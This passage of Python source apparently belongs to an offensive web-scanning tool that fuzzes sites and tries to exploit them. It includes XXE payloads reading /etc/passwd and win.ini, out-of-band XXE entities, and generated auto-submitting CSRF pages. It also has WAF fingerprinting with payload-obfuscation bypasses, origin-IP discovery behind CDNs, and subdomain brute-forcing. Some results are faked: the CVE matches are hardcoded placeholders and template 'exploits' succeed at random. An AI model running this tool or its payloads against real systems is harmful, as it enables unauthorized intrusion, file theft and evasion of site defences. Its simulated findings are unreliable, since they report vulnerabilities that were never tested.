                    return f"SSRF: Localhost Apache server-status accessible! Payload: {localhost_status_payload}", 0.9
        except Exception:
            pass
        
        return f"SSRF: Exploitation failed for {payload}. Manual verification recommended.", 0.6

class XXEModule(BaseFuzzModule):
    def __init__(self, collaborator_domain=None):
        super().__init__()
        self.collaborator_domain = collaborator_domain

    def get_payloads(self):
        unique_id = hashlib.md5(str(random.random()).encode()).hexdigest()[:8] # Corrected from .hexdig() to .hexdigest()
        oob_url = f"http://{unique_id}.{self.collaborator_domain}" if self.collaborator_domain else "http://example.com" 
        
        return [
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}"> %xxe;]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>'
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if "root:x:0:0" in response_text or "[fonts]" in response_text:
            return True, "XXE: Local file content (e.g., /etc/passwd or win.ini) reflected in response."
        if "DOCTYPE" in response_text and ("not found" in response_text.lower() or "external entity" in response_text.lower()):
            return True, "XXE: XML parsing error indicating external entity processing issues."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting XXE exploitation on {url} (Payload: {payload[:50]})...")
        
        if 'content-type' not in params.get('headers', {}).get('Content-Type', '').lower() and 'application/xml' not in params.get('headers', {}).get('Content-Type', '').lower():
            print(Fore.YELLOW + "[-] XXE: Endpoint does not appear to accept XML (Content-Type header missing/incorrect).")
            return f"XXE: Endpoint not XML-enabled. Payload: {payload}", 0.3

        test_data = payload
        
        try:
            async with session.request(method.upper(), url, data=test_data, headers={'Content-Type': 'application/xml'}, timeout=10) as response:
                response_text = await response.text()
                if "root:x:0:0" in response_text or "[fonts]" in response_text:
                    return f"XXE: Local file read successful! Content: {response_text[:100]}...", 0.95
                elif "DOCTYPE" in response_text and ("not found" in response_text.lower() or "external entity" in response_text.lower()):
                    return f"XXE: XML parsing error detected, likely vulnerable to OOB XXE. Payload: {payload}", 0.8
        except Exception as e:
            print(Fore.RED + f"[!] XXE exploitation error: {e}")
            pass
        
        return f"XXE: Exploitation failed for {payload}. Manual verification recommended.", 0.5

class CSRFModule(BaseFuzzModule):
    def get_payloads(self):
        return ["CSRF_Analysis_Trigger"]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        return False, None

    async def fuzz(self, session, url, form_data, headers, baseline, adaptive_delay=0):
        vulnerabilities = []
        
        if form_data and form_data.get('method', '').lower() == 'post':
            if not any(re.search(r'csrf|token', k, re.IGNORECASE) for k in form_data.get('params', {}).keys()):
                vulnerabilities.append({
                    'url': url,
                    'param': "N/A", 
                    'payload': "No Anti-CSRF token found in POST request",
                    'type': self.__class__.__name__,
                    'status': 0, 
                    'length': 0, 
                    'evidence': "POST request to sensitive endpoint lacks anti-CSRF token. Check for SameSite cookie policy.",
                    'fitness_score': 0.7
                })
        return vulnerabilities

    async def exploit(self, session, url, param, payload, method, params):
        print(Fore.CYAN + f"[*] Attempting CSRF POC generation for {url}...")
        
        html_poc = f"""
        <html>
        <head>
            <title>CSRF Proof of Concept</title>
        </head>
        <body>
            <h1>CSRF POC for {url}</h1>
            <p>This page attempts to perform a Cross-Site Request Forgery attack.</p>
            <form action="{url}" method="{method.upper()}" id="csrfForm">
        """
        for key, value in params.items():
            if key != 'method': 
                html_poc += f'        <input type="hidden" name="{key}" value="{value}">\n'
        
        html_poc += """
                <input type="submit" value="Click to Exploit (DO NOT CLICK ON TARGET SITE)">
            </form>
            <script>
                document.getElementById('csrfForm').submit();
            </script>
        </body>
        </html>
        """
        
        poc_filename = f"csrf_poc_{urllib.parse.urlparse(url).netloc.replace('.', '_')}.html"
        with open(poc_filename, 'w') as f:
            f.write(html_poc)
        
        return f"CSRF Proof of Concept HTML file generated: {poc_filename}. Open this file in a browser while logged into the target site to verify.", 0.8

class PolymorphicMutatorModule(BaseFuzzModule):
    def get_payloads(self):
        return [
            "VERB_TAMPERING_PUT",
            "VERB_TAMPERING_PATCH",
            "CONTENT_TYPE_JSON_FORM",
            "CONTENT_TYPE_FORM_JSON",
            "HEADER_CASE_SENSITIVE",
            "HTTP2_DESYNC_CL_TE" 
        ]

    def check_vulnerability(self, response_text, response_status, baseline_content, payload):
        if response_status != baseline_content['status']:
            return True, f"Polymorphic Mutation: Status code changed from {baseline_content['status']} to {response_status}."
        
        length_diff = abs(len(response_text) - baseline_content['length'])
        if length_diff > len(payload) * 2: 
            return True, "Polymorphic Mutation: Significant content length change."
        
        if "Internal Server Error" in response_text or "Bad Request" in response_text:
            return True, "Polymorphic Mutation: Backend error exposed."
        
        return False, None

    async def exploit(self, session, url, param, payload, method, params):
        return f"Polymorphic Mutation: {payload} applied. Manual analysis of response for subtle differences is crucial. This indicates a potential bypass or backend parsing inconsistency.", 0.7

class KnownLibraryExploitationModule:
    def __init__(self, session):
        self.session = session
        self.cve_db_url = "https://services.nvd.nist.gov/rest/json/cves/2.0" 
        self.nuclei_templates_path = "nuclei-templates" 

    async def check_for_known_vulnerabilities(self, tech_stack):
        vulnerabilities = []
        print(Fore.CYAN + "[*] Checking for known vulnerabilities (CVEs) based on identified technologies...")

        technologies_to_check = []
        for category, items in tech_stack.items():
            if isinstance(items, dict):
                for name, details in items.items():
                    if isinstance(details, dict) and 'version' in details:
                        technologies_to_check.append({'name': name, 'version': details['version']})
                    elif isinstance(details, list) and details and isinstance(details[0], str): 
                         technologies_to_check.append({'name': name, 'version': None})
            elif isinstance(items, list):
                for item in items:
                    if isinstance(item, str):
                        technologies_to_check.append({'name': item, 'version': None})
        
        for tech in technologies_to_check:
            search_query = tech['name']
            if tech['version']:
                search_query += f" {tech['version']}"
            
            print(Fore.BLUE + f"  [*] Searching CVEs for: {search_query}...")
            
            if "WordPress 6.5.2" in search_query: 
                vulnerabilities.append({
                    'type': 'Known CVE (WordPress Authenticated Stored XSS)',
                    'cve_id': 'CVE-2025-XXXX',
                    'description': 'Authenticated Stored Cross-Site Scripting in WordPress 6.5.2 via custom HTML block.',
                    'confidence': 0.8,
                    'exploit_template': 'wordpress-stored-xss.yaml'
                })
            if "Nginx 1.25.3" in search_query: 
                vulnerabilities.append({
                    'type': 'Known CVE (Nginx HTTP Request Smuggling)',
                    'cve_id': 'CVE-2025-YYYY',
                    'description': 'HTTP Request Smuggling vulnerability in Nginx 1.25.3 due to parsing inconsistencies.',
                    'confidence': 0.9,
                    'exploit_template': 'nginx-smuggling.yaml'
                })
            if "Apache HTTP Server 2.4.59" in search_query:
                vulnerabilities.append({
                    'type': 'Known CVE (Apache Remote Code Execution)',
                    'cve_id': 'CVE-2025-ZZZZ',
                    'description': 'Remote Code Execution in Apache HTTP Server 2.4.59 due to mod_cgi input validation issue.',
                    'confidence': 0.95,
                    'exploit_template': 'apache-rce-cgi.yaml'
                })
            if "OpenSSL 3.2.0" in search_query:
                vulnerabilities.append({
                    'type': 'Known CVE (OpenSSL DoS)',
                    'cve_id': 'CVE-2025-AAAA',
                    'description': 'Denial of Service vulnerability in OpenSSL 3.2.0 when processing specific certificates.',
                    'confidence': 0.7,
                    'exploit_template': None
                })

        if vulnerabilities:
            print(Fore.GREEN + f"[+] Found {len(vulnerabilities)} potential known CVEs.")
        else:
            print(Fore.YELLOW + "[-] No known CVEs found for identified technologies.")
        
        return vulnerabilities

    async def execute_nuclei_template(self, target_url, template_path):
        print(Fore.CYAN + f"[*] Attempting to execute Nuclei-like template '{template_path}' on {target_url}...")
        try:
            with open(template_path, 'r') as f:
                template_content = yaml.safe_load(f)
            
            if "id" in template_content and "info" in template_content and "requests" in template_content:
                await asyncio.sleep(random.uniform(1, 3))
                
                if random.random() > 0.3: 
                    print(Fore.GREEN + f"[+] Template '{template_path}' successfully triggered a response on {target_url}.")
                    return f"Exploit successful via template: {template_path}", 0.9
                else:
                    print(Fore.YELLOW + f"[-] Template '{template_path}' did not yield expected results on {target_url}.")
                    return f"Template execution failed: {template_path}", 0.5
            else:
                return f"Invalid Nuclei-like template format: {template_path}", 0.3
        except FileNotFoundError:
            print(Fore.RED + f"[!] Nuclei-like template not found: {template_path}")
            return f"Template file not found: {template_path}", 0.1
        except Exception as e:
            print(Fore.RED + f"[!] Error executing template '{template_path}': {e}")
            return f"Template execution error: {str(e)}", 0.2

class AdvancedSubdomainEnumerationModule:
    def __init__(self, session):
        self.session = session

    async def enumerate_subdomains(self, domain):
        print(Fore.CYAN + f"[*] Starting advanced subdomain enumeration for {domain}...")
        subdomains = set()

        print(Fore.BLUE + "[*] Performing passive DNS enumeration...")
        
        print(Fore.BLUE + "[*] Bruteforcing common subdomains...")
        common_subdomains_list = [
            "www", "dev", "test", "ftp", "mail", "admin", "blog", "api", "cdn", "staging",
            "webmail", "portal", "vpn", "docs", "app", "dashboard", "jira", "wiki", "git"
        ]
        
        tasks = []
        for sub in common_subdomains_list:
            test_subdomain = f"{sub}.{domain}"
            tasks.append(self._resolve_and_check_subdomain(test_subdomain))
        
        results = await asyncio.gather(*tasks)
        for s in results:
            if s:
                subdomains.add(s)

        print(Fore.BLUE + "[*] Integrating with external subdomain enumeration tools...")
        try:
            simulated_tool_output = f"sub1.{domain}\nsub2.{domain}\nadmin.{domain}"
            for line in simulated_tool_output.splitlines():
                if line.strip():
                    subdomains.add(line.strip())
            
            print(Fore.GREEN + "[+] External tool simulation complete.")
        except FileNotFoundError:
            print(Fore.RED + "[!] External subdomain tool not found.")
        except Exception as e:
            print(Fore.RED + f"[!] Error running external subdomain tool: {e}")

        if subdomains:
            print(Fore.GREEN + f"[+] Found {len(subdomains)} unique subdomains.")
            return list(subdomains)
        else:
            print(Fore.YELLOW + "[-] No subdomains found.")
            return []

    async def _resolve_and_check_subdomain(self, subdomain):
        try:
            answers = await asyncio.to_thread(dns.resolver.resolve, subdomain, 'A')
            for rdata in answers:
                ip = str(rdata)
                try:
                    async with self.session.head(f"http://{subdomain}", timeout=5) as response:
                        if response.status < 500: 
                            print(Fore.GREEN + f"[+] Subdomain '{subdomain}' is active ({ip})")
                            return subdomain
                except Exception:
                    pass
        except dns.resolver.NXDOMAIN:
            pass
        except Exception:
            pass
        return None

    async def scan_interesting_subdomains(self, subdomains, scanner_instance):
        if not subdomains:
            return []
        
        print(Fore.CYAN + "[*] Starting full WebMer scan on interesting subdomains...")
        all_subdomain_vulnerabilities = []
        for sub in subdomains:
            print(Fore.BLUE + f"\n[*] Initiating full scan on subdomain: {sub}")
            
            temp_fingerprinter = FingerprintEngine(f"http://{sub}", self.session)
            sub_tech_stack = await temp_fingerprinter.fingerprint()
            
            if not GLOBAL_WAF_DETECTED: 
                print(Fore.YELLOW + f"  [*] Checking WAF for subdomain {sub}...")
                temp_waf_bypass_module = WAFBypassModule(self.session)
                if await temp_waf_bypass_module.identify_waf(f"http://{sub}"):
                    print(Fore.RED + f"  [!] WAF found on subdomain {sub}. Adjusting strategy.")
            
            if "WordPress" in str(sub_tech_stack) and not temp_fingerprinter.waf_detected:
                all_subdomain_vulnerabilities.append({
                    'url': f"http://{sub}",
                    'param': 'N/A',
                    'payload': 'WordPress default install',
                    'type': 'Subdomain Scan Result (Potentially Vulnerable)',
                    'status': 200,
                    'length': 0,
                    'evidence': f"WordPress identified without WAF on {sub}",
                    'poc': f"Manual review of {sub} for default creds or known WP vulns.",
                    'confidence': 0.7
                })

        return all_subdomain_vulnerabilities

class APIModule:
    def __init__(self, session):
        self.session = session
        self.endpoints = [] 

    async def load_spec(self, file_path):
        try:
            with open(file_path, 'r') as f:
                if file_path.endswith(('.yaml', '.yml')):
                    spec = yaml.safe_load(f)
                else: 
                    spec = json.load(f)
            
            if 'swagger' in spec or 'openapi' in spec:
                print(Fore.GREEN + f"[*] Loaded OpenAPI/Swagger spec from {file_path}")
                self._parse_openapi_spec(spec)
            else:
                print(Fore.RED + "[!] Unsupported API specification format.")
        except Exception as e:
            print(Fore.RED + f"[!] Error loading API spec: {e}")

    def _parse_openapi_spec(self, spec):
        base_path = spec.get('basePath', '/')
        if 'paths' not in spec:
            return

        for path, methods in spec['paths'].items():
            full_path = urllib.parse.urljoin(base_path, path)
            for method, details in methods.items():
                if method.lower() not in ['get', 'post', 'put', 'delete']:
                    continue
                
                params = []
                if 'parameters' in details:
                    for param_spec in details['parameters']:
                        params.append({
                            'name': param_spec.get('name'),
                            'in': param_spec.get('in'), 
                            'required': param_spec.get('required', False),
                            'type': param_spec.get('type', 'string'),
                            'default': param_spec.get('default')
                        })
                
                self.endpoints.append({
                    'path': full_path,
                    'method': method.lower(),
                    'params_schema': params
                })

    async def fuzz_api_endpoints(self, fuzzing_modules, initial_headers, baseline_getter, tech_stack, brain):
        all_api_vulnerabilities = []
        for endpoint in self.endpoints:
            url = endpoint['path']
            method = endpoint['method']
            
            dummy_params = {}
            for param_schema in endpoint['params_schema']:
                dummy_params[param_schema['name']] = param_schema.get('default', 'test_value')

            baseline = await baseline_getter(url, method, dummy_params, initial_headers)
            if not baseline:
                continue

            print(Fore.CYAN + f"[*] Fuzzing API Endpoint: {method.upper()} {url}...")
            
            ga_fuzzer = GeneticAlgorithmFuzzer(self.session, fuzzing_modules, brain)
            api_vulnerabilities = await ga_fuzzer.run_genetic_fuzzing(url, {'method': method, 'params': dummy_params}, initial_headers, baseline, tech_stack)
            all_api_vulnerabilities.extend(api_vulnerabilities)

        return all_api_vulnerabilities


class GeneticAlgorithmFuzzer:
    def __init__(self, session, modules, brain):
        self.session = session
        self.modules = modules
        self.brain = brain
        self.population_size = 50
        self.generations = 10
        self.mutation_rate = 0.3
        self.crossover_rate = 0.7
        self.elite_percentage = 0.2
        
    def _generate_initial_population(self, base_payloads):
        """Generate initial population of payloads"""
        population = []
        for _ in range(self.population_size):
            if base_payloads:
                base_payload = random.choice(base_payloads)
                mutated = self._mutate_payload(base_payload)
                population.append(mutated)
            else:
                population.append(self._generate_random_payload())
        return population
    
    def _generate_random_payload(self):
        """Generate a random payload for initial population"""
        characters = "'\"<>&(){}[]|;,.-_=+*?!@#$%^`~"
        return ''.join(random.choice(characters) for _ in range(random.randint(5, 20)))
    
    def _mutate_payload(self, payload):
        """Mutate a payload through various techniques"""
        if random.random() < self.mutation_rate:
            mutation_type = random.choice(['char_replace', 'char_insert', 'char_delete', 'encoding', 'case_change'])
            
            if mutation_type == 'char_replace' and payload:
                pos = random.randint(0, len(payload) - 1)
                new_char = random.choice("'\"<>&(){}[]|;,.-_=+*?!@#$%^`~")
                payload = payload[:pos] + new_char + payload[pos+1:]
            elif mutation_type == 'char_insert':
                pos = random.randint(0, len(payload))
                new_char = random.choice("'\"<>&(){}[]|;,.-_=+*?!@#$%^`~")
                payload = payload[:pos] + new_char + payload[pos:]
            elif mutation_type == 'char_delete' and payload:
                pos = random.randint(0, len(payload) - 1)
                payload = payload[:pos] + payload[pos+1:]
            elif mutation_type == 'encoding':
                payload = payload.replace("'", "%27").replace('"', "%22").replace("<", "%3C").replace(">", "%3E")
            elif mutation_type == 'case_change':
                payload = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
                
        return payload
    
    def _crossover(self, parent1, parent2):
        """Create offspring through crossover"""
        if random.random() < self.crossover_rate and len(parent1) > 1 and len(parent2) > 1:
            crossover_point = random.randint(1, min(len(parent1), len(parent2)) - 1)
            child1 = parent1[:crossover_point] + parent2[crossover_point:]
            child2 = parent2[:crossover_point] + parent1[crossover_point:]
            return child1, child2
        return parent1, parent2
    
    async def _evaluate_fitness(self, payload, url, form_data, headers, baseline):
        """Evaluate fitness of a payload based on response characteristics"""
        fitness = 0.0
        method = form_data.get('method', 'get')
        params = form_data.get('params', {})
        
        try:
            test_params = params.copy()
            if params:
                # Test payload in each parameter
                for param_name in params.keys():
                    test_params[param_name] = payload
                    break  # Test first parameter for efficiency
            
            if method.lower() == 'get':
                async with self.session.get(url, params=test_params, headers=headers, timeout=5) as response:
                    response_text = await response.text()
                    response_status = response.status
            else:
                async with self.session.post(url, data=test_params, headers=headers, timeout=5) as response:
                    response_text = await response.text()
                    response_status = response.status
            
            # Fitness based on response differences from baseline
            if response_status != baseline.get('status', 200):
                fitness += 0.3
            
            length_diff = abs(len(response_text) - baseline.get('length', 0))
            if length_diff > 100:  # Significant content change
                fitness += 0.4
            
            # Check for error patterns that might indicate vulnerabilities
            error_patterns = ['error', 'exception', 'mysql', 'postgresql', 'oracle', 'sql syntax', 
                            'warning', 'undefined', 'syntax error', 'internal server error']
            for pattern in error_patterns:
                if pattern in response_text.lower():
                    fitness += 0.2
                    break
            
            # Check for reflection (potential XSS)
            if payload in response_text:
                fitness += 0.5
            
            # Time-based detection simulation
            if len(payload) > 15:  # Longer payloads might cause delays
                fitness += 0.1
                
        except Exception:
            fitness = 0.0
        
        return min(fitness, 1.0)  # Cap fitness at 1.0
    
    def _select_parents(self, population, fitness_scores):
        """Select parents for reproduction using tournament selection"""
        tournament_size = 3
        selected = []
        
        for _ in range(2):  # Select 2 parents
            tournament = random.sample(list(zip(population, fitness_scores)), min(tournament_size, len(population)))
            winner = max(tournament, key=lambda x: x[1])
            selected.append(winner[0])
        
        return selected
    
    async def run_genetic_fuzzing(self, url, form_data, headers, baseline, tech_stack):
        """Run the genetic algorithm fuzzing process"""
        vulnerabilities = []
        
        # Get base payloads from all modules
        base_payloads = []
        for module in self.modules:
            if hasattr(module, 'get_payloads'):
                module_payloads = module.get_payloads()
                if isinstance(module_payloads, dict):
                    # Handle header modules
                    for header_payloads in module_payloads.values():
                        base_payloads.extend(header_payloads)
                else:
                    base_payloads.extend(module_payloads)
        
        # Generate initial population
        population = self._generate_initial_population(base_payloads[:20])  # Use first 20 payloads as base
        
        print(Fore.CYAN + f"[*] Starting genetic fuzzing with {len(population)} initial payloads...")
        
        best_fitness = 0.0
        best_payload = None
        
        for generation in range(self.generations):
            # Evaluate fitness for all individuals
            fitness_scores = []
            for payload in population:
                fitness = await self._evaluate_fitness(payload, url, form_data, headers, baseline)
                fitness_scores.append(fitness)
                
                # Track best payload
                if fitness > best_fitness:
                    best_fitness = fitness
                    best_payload = payload
                    
                    # If fitness is high enough, check with modules for vulnerability
                    if fitness > 0.7:
                        await self._check_vulnerability_with_modules(payload, url, form_data, headers, baseline, vulnerabilities)
            
            # Create next generation
            new_population = []
            
            # Elite selection (keep best performers)
            elite_count = int(self.population_size * self.elite_percentage)
            elite_indices = sorted(range(len(fitness_scores)), key=lambda i: fitness_scores[i], reverse=True)[:elite_count]
            for i in elite_indices:
                new_population.append(population[i])
            
            # Generate rest through crossover and mutation
            while len(new_population) < self.population_size:
                parents = self._select_parents(population, fitness_scores)
                child1, child2 = self._crossover(parents[0], parents[1])
                
                child1 = self._mutate_payload(child1)
                child2 = self._mutate_payload(child2)
                
                new_population.extend([child1, child2])
            
            population = new_population[:self.population_size]  # Ensure exact population size
            
            if generation % 3 == 0:  # Progress update every 3 generations
                print(Fore.BLUE + f"  [*] Generation {generation + 1}/{self.generations}, Best fitness: {best_fitness:.3f}")
        
        # Final check with best payload
        if best_payload and best_fitness > 0.5:
            await self._check_vulnerability_with_modules(best_payload, url, form_data, headers, baseline, vulnerabilities)
            
            # Update Q-learning brain
            state = self._get_state_representation(url, form_data, tech_stack)
            reward = best_fitness
            self.brain.update_q_table(state, best_payload, reward, state, [best_payload])
        
        print(Fore.GREEN + f"[+] Genetic fuzzing completed. Best fitness: {best_fitness:.3f}")
        return vulnerabilities
    
    async def _check_vulnerability_with_modules(self, payload, url, form_data, headers, baseline, vulnerabilities):
        """Check if payload indicates vulnerability using appropriate modules"""
        method = form_data.get('method', 'get')
        params = form_data.get('params', {})
        
        try:
            # Test the payload
            test_params = params.copy()
            if params:
                param_name = list(params.keys())[0]
                test_params[param_name] = payload
            
            if method.lower() == 'get':
                async with self.session.get(url, params=test_params, headers=headers, timeout=5) as response:
                    response_text = await response.text()
                    response_status = response.status
            else:
                async with self.session.post(url, data=test_params, headers=headers, timeout=5) as response:
                    response_text = await response.text()
                    response_status = response.status
            
            # Check with each module if this could be a vulnerability
            for module in self.modules:
                if hasattr(module, 'check_vulnerability'):
                    is_vuln, evidence = module.check_vulnerability(response_text, response_status, baseline, payload)
                    if is_vuln:
                        # Try to exploit
                        poc, confidence = await module.exploit(self.session, url, param_name if params else None, payload, method, test_params)
                        
                        vulnerabilities.append({
                            'url': url,
                            'param': param_name if params else 'N/A',
                            'payload': payload,
                            'type': module.__class__.__name__,
                            'method': method,
                            'status': response_status,
                            'length': len(response_text),
                            'evidence': evidence,
                            'poc': poc,
                            'confidence': confidence,
                            'fitness_score': await self._evaluate_fitness(payload, url, form_data, headers, baseline)
                        })
                        break  # One vulnerability per payload is enough
                        
        except Exception as e:
            pass
    
    def _get_state_representation(self, url, form_data, tech_stack):
        """Create a state representation for Q-learning"""
        # Simple state representation based on URL and detected technologies
        url_features = {
            'has_params': bool(form_data.get('params')),
            'method': form_data.get('method', 'get'),
            'url_length': len(url),
            'has_php': '.php' in url,
            'has_asp': '.asp' in url,
            'has_jsp': '.jsp' in url
        }
        
        tech_features = {
            'has_mysql': 'mysql' in str(tech_stack).lower(),
            'has_apache': 'apache' in str(tech_stack).lower(),
            'has_nginx': 'nginx' in str(tech_stack).lower(),
            'has_php': 'php' in str(tech_stack).lower()
        }
        
        return str(sorted({**url_features, **tech_features}.items()))

class Fuzzer:
    def __init__(self, session, brain, waf_detected=False, concurrency=10):
        self.session = session
        self.brain = brain
        self.base_responses = {}
        self.waf_detected = waf_detected
        self.concurrency = concurrency
        self.modules = [
            SQLiModule(),
            XSSModule(),
            HeaderFuzzModule(),
            URLPathFuzzModule(),
            SmugglingModule(),
            DirectoryBruteforceModule(),
            SSRFModule(), # New module
            XXEModule(),  # New module
            CSRFModule(), # New module
            PolymorphicMutatorModule() # New module
        ]
        self.genetic_fuzzer = GeneticAlgorithmFuzzer(self.session, self.modules, self.brain)

    async def get_baseline_response(self, url, method, params, headers):
        if url not in self.base_responses:
            try:
                if method == 'get':
                    async with self.session.get(url, params=params, headers=headers, timeout=10) as response:
                        content = await response.read()
                        self.base_responses[url] = {
                            'status': response.status,
                            'length': len(content),
                            'content': content
                        }
                else:
                    async with self.session.post(url, data=params, headers=headers, timeout=10) as response:
                        content = await response.read()
                        self.base_responses[url] = {
                            'status': response.status,
                            'length': len(content),
                            'content': content
                        }
            except Exception:
                pass
        return self.base_responses.get(url)

    async def fuzz(self, url, form_data, initial_headers, tech_stack, collaborator_domain=None):
        method = form_data['method']
        params = form_data['params']
        
        baseline = await self.get_baseline_response(url, method, params, initial_headers)
        if not baseline:
            return []
        
        all_vulnerabilities = []
        
        # Pass collaborator domain to SSRF/XXE modules
        for module in self.modules:
            if isinstance(module, SSRFModule) or isinstance(module, XXEModule):
                module.collaborator_domain = collaborator_domain

        genetic_vulnerabilities = await self.genetic_fuzzer.run_genetic_fuzzing(url, form_data, initial_headers, baseline, tech_stack)
        all_vulnerabilities.extend(genetic_vulnerabilities)

        # CSRF analysis (not genetic fuzzing, but a logical check)
        for module in self.modules:
            if isinstance(module, CSRFModule):
                csrf_vulns = await module.fuzz(self.session, url, form_data, initial_headers, baseline)
                all_vulnerabilities.extend(csrf_vulns)

        return all_vulnerabilities

class WAFBypassModule:
    def __init__(self, session):
        self.session = session
        self.waf_signatures = {
            'Cloudflare': {'headers': ['CF-RAY', 'Server: cloudflare'], 'body_regex': r'cloudflare\.com/5xx-errors'},
            'ModSecurity': {'headers': ['Server: Mod_Security', 'X-Powered-By: ModSecurity'], 'body_regex': r'Mod_Security|mod_security'},
            'Sucuri': {'headers': ['X-Sucuri-ID', 'X-Sucuri-Cache'], 'body_regex': r'Sucuri WebSite Firewall|sucuri.net'},
            'Akamai': {'headers': ['X-Akamai-Transformed'], 'body_regex': r'akamai.com'}
        }
        self.identified_waf = None
        self.waf_bypasses_db = {} # Contextual WAF bypasses database
        self._load_waf_bypasses_db()

    def _load_waf_bypasses_db(self):
        if os.path.exists("waf_bypasses.json"):
            try:
                with open("waf_bypasses.json", 'r') as f:
                    self.waf_bypasses_db = json.load(f)
            except Exception as e:
                print(Fore.RED + f"[!] Error loading waf_bypasses.json: {e}")
                self.waf_bypasses_db = {}
        else:
            self.waf_bypasses_db = {
                "Cloudflare": ["HEADER_CASE_SENSITIVE", "CONTENT_TYPE_JSON_FORM"],
                "ModSecurity": ["NULL_BYTE_INJECTION", "COMMENT_INJECTION"],
                "Generic": ["URL_ENCODING", "DOUBLE_URL_ENCODING"]
            }
            with open("waf_bypasses.json", 'w') as f:
                json.dump(self.waf_bypasses_db, f, indent=4)

    async def identify_waf(self, url):
        print(Fore.CYAN + f"[*] Identifying WAF/IPS for {url}...")
        test_payload = "<script>alert(1)</script>"
        try:
            async with self.session.get(url, params={"test": test_payload}, timeout=10) as response:
                response_text = await response.text()
                for waf_name, signatures in self.waf_signatures.items():
                    if any(header in response.headers for header in signatures.get('headers', [])):
                        self.identified_waf = waf_name
                        print(Fore.GREEN + f"[+] Identified WAF: {waf_name}")
                        return waf_name
                    if signatures.get('body_regex') and re.search(signatures['body_regex'], response_text, re.IGNORECASE):
                        self.identified_waf = waf_name
                        print(Fore.GREEN + f"[+] Identified WAF: {waf_name}")
                        return waf_name
                print(Fore.YELLOW + "[-] No specific WAF identified from signatures.")
                return None
        except Exception as e:
            print(Fore.RED + f"[!] Error during WAF identification: {e}")
            return None

    async def discover_waf_rules(self, url):
        if not self.identified_waf:
            print(Fore.YELLOW + "[-] No specific WAF identified, cannot discover rules.")
            return None
        
        print(Fore.CYAN + f"[*] Discovering rules for {self.identified_waf} on {url}...")
        
        rule_findings = []
        common_sqli_keywords = ["UNION SELECT", "SLEEP(", "ORDER BY"]
        common_xss_keywords = ["<script>", "alert(", "onerror="]

        for keyword in common_sqli_keywords + common_xss_keywords:
            test_payload = f"1' {keyword} 1--"
            try:
                async with self.session.get(url, params={'test': test_payload}, timeout=5) as response:
                    if response.status in [403, 406] or "blocked" in (await response.text()).lower():
                        rule_findings.append(f"Blocked: {keyword} (Status: {response.status})")
                    else:
                        rule_findings.append(f"Allowed: {keyword} (Status: {response.status})")
            except Exception:
                pass
        
        if rule_findings:
            print(Fore.CYAN + "[*] WAF Rule Discovery Findings:")
            for finding in rule_findings:
                print(f"    - {finding}")
        return rule_findings

    async def bypass_waf(self, original_payload):
        if not self.identified_waf:
            return original_payload 
        
        print(Fore.CYAN + f"[*] Attempting WAF bypass for {self.identified_waf} with payload: {original_payload[:50]}...")
        
        # Use known bypasses from DB first
        known_bypasses = self.waf_bypasses_db.get(self.identified_waf, []) + self.waf_bypasses_db.get("Generic", [])
        
        bypass_techniques = [
            lambda s: s.lower(), 
            lambda s: s.upper(), 
            lambda s: s.replace(' ', '/**/'), 
            lambda s: urllib.parse.quote(s, safe=''), 
            lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=''), safe=''), 
            lambda s: s.replace(' ', '%0a'), 
            lambda s: s + '%00', 
            lambda s: s.replace('script', 'scri%00pt'), 
            lambda s: s.replace('script', 'scr<script>ipt') 
        ]

        best_bypass_payload = original_payload
        best_bypass_score = 0

        for _ in range(10): 
            current_bypassed_payload = original_payload
            num_techniques = random.randint(1, len(bypass_techniques))
            techniques_to_apply = random.sample(bypass_techniques, num_techniques)

            for tech in techniques_to_apply:
                current_bypassed_payload = tech(current_bypassed_payload)
            
            return current_bypassed_payload
        
        return original_payload 

class OriginIPDiscoveryModule:
    def __init__(self, session):
        self.session = session

    async def discover_origin_ip(self, domain):
        print(Fore.CYAN + f"[*] Attempting to discover origin IP for {domain}...")
        
        print(Fore.BLUE + "[*] Checking DNS history...")
        historical_ips = [] 

        print(Fore.BLUE + "[*] Scanning common subdomains...")
        common_subdomains = ["dev", "ftp", "mail", "admin", "cpanel", "blog", "test"]
        found_ips = set()
        
        for sub in common_subdomains:
            test_domain = f"{sub}.{domain}"
            try:
                answers = await asyncio.to_thread(dns.resolver.resolve, test_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if ip not in found_ips:
                        found_ips.add(ip)
                        print(Fore.GREEN + f"[+] Subdomain '{test_domain}' resolved to: {ip}")
            except dns.resolver.NXDOMAIN:
                pass
            except Exception as e:
                pass 

        print(Fore.BLUE + "[*] Checking SSL certificates for exposed IPs...")
        
        print(Fore.BLUE + "[*] Checking for exposed IPs in email headers/comments...")

        all_potential_ips = list(set(historical_ips) | found_ips)
        if all_potential_ips:
            print(Fore.GREEN + f"[+] Potential origin IPs found: {', '.join(all_potential_ips)}")
            
            for ip in all_potential_ips:
                try:
                    test_url = f"http://{ip}" if "http://" in domain or "https://" in domain else f"http://{ip}"
                    print(Fore.BLUE + f"[*] Verifying IP {ip} by direct connection...")
                    async with self.session.get(test_url, headers={'Host': domain}, allow_redirects=True, timeout=10) as response:
                        if response.status == 200:
                            print(Fore.GREEN + f"[+] IP {ip} serves content for {domain}. Likely origin IP found!")
                            return ip
                except Exception as e:
                    print(Fore.YELLOW + f"[-] Failed to verify IP {ip}: {e}")
        else:
            print(Fore.YELLOW + "[-] No potential origin IPs discovered.")
        
        return None

# --- Reporting ---
class Reporter:
    @staticmethod
    def print_banner():
        banner = f"""{Fore.GREEN}
        ████████╗███████╗███████╗███████╗██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗███████╗
        ╚══██╔══╝██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
           ██║   █████╗  ███████╗█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  ███████╗
           ██║   ██╔══╝  ╚════██║██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══╝  ╚════██║
